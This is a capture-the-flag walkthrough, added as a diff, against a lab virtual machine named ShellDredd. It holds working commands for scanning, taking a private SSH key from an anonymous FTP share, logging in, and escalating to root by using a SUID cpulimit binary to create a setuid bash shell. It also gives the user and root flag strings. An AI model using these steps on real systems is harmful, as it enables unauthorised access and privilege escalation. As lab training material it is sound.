@@ -1,0 +1,159 @@
+[*]
+1. Discover host: nmap 172.16.16.46
+MAC Address: 08:00:27:5C:40:14 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.46
+Host is up (0.00027s latency).
+MAC Address: 08:00:27:ED:76:90 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.43
+Host is up.
+
+[*]
+2. quick scan: nmap 172.16.16.46 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-10 15:25 CDT
+Nmap scan report for 172.16.16.46
+Host is up (0.00014s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+21/tcp open  ftp
+MAC Address: 08:00:27:ED:76:90 (Ora
+
+[*]
+3. Service scan: nmap -A -p 21 172.16.16.46
+21/tcp open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:172.16.16.43
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+
+[*]
+4. Background fullscan: nmap -p- 172.16.16.46
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-10 15:26 CDT
+Nmap scan report for 172.16.16.46
+Host is up (0.00014s latency).
+Not shown: 65533 closed ports
+PORT      STATE SERVICE
+21/tcp    open  ftp
+61000/tcp open  unknown
+
+[*]
+5. FTP enumeration: ftp 172.16.16.46
+ftp:ftp
+ls -la
+21/tcp open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:172.16.16.43
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 0        115          4096 Aug 06 16:56 .
+drwxr-xr-x    3 0        115          4096 Aug 06 16:56 ..
+drwxr-xr-x    2 0        0            4096 Aug 06 16:54 .hannah
+cd .hannah
+ls -la
+150 Here comes the directory listing.
+-rwxr-xr-x    1 0        0            1823 Aug 06 16:54 id_rsa
+get id_rsa
+**downloaded**
+
+[*]
+6. Enumerate 61000: nc -nv 172.16.16.46 61000
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Connected to 172.16.16.46:61000.
+SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
+
+[*]
+7. Ok great. We can assume we are supposed to ssh into the host on this port. If I had to guess, hannah as the username.
+
+ssh -o "IdentitiesOnly=yes" -i id_rsa -p 61000 hannah@172.16.16.46
+
+[*]
+8. Check permissions: hannah@ShellDredd:~$ sudo -l
+-bash: sudo: orden no encontrada
+
+**OOF**, spanish?
+
+[*]
+9. Found artifact:
+hannah@ShellDredd:~$ cat user.txt
+Gr3mMhbCpuwxCZorqDL3ILPn
+
+[*]
+10. Check what can run as root: find / -perm -4000 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/umount
+/usr/bin/mawk
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/cpulimit
+/usr/bin/mount
+/usr/bin/passwd
+
+[*]
+11. Found another artifact: ls -la .ssh
+hannah@ShellDredd:~$ ls -la .ssh
+total 16
+drwxr-xr-x 2 root   root   4096 ago  6 16:54 .
+drwxr-xr-x 4 hannah hannah 4096 sep  5 11:37 ..
+-rw-r--r-- 1 root   root    395 ago  6 16:53 authorized_keys
+-rw------- 1 root   root   1823 ago  6 16:53 id_rsa
+
+[*]
+12. authorized_keys isn't writeable, and id_rsa isn't readable :(
+
+[*]
+13. Check cpulimit
+CPUlimit version 2.4
+Usage: cpulimit TARGET [OPTIONS...] [-- PROGRAM]
+   TARGET must be exactly one of these:
+      -p, --pid=N        pid of the process
+      -e, --exe=FILE     name of the executable program file
+                         The -e option only works when
+                         cpulimit is run with admin rights.
+      -P, --path=PATH    absolute path name of the
+                         executable program file
+cpulimit -l 100 -f whoami
+root
+
+[*]
+14. Very nice. Lets get ourselves root
+cpulimit -l 100 -f cp /bin/bash shell
+cpulimit -l 100 -f chmod 755 shell
+cpulimit -l 100 -f chmod u+s shell
+./shell -p
+shell-5.0# id
+uid=1000(hannah) gid=1000(hannah) euid=0(root) grupos=1000(hannah),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
+
+[*]
+15. Capture the flag:
+ls -la /root
+-rw-r--r--  1 root root   25 ago  6 18:27 root.txt
+cat root.txt
+cat /root/root.txt
+yeZCB44MPH2KQwbssgTQ2Nof
+
+
+
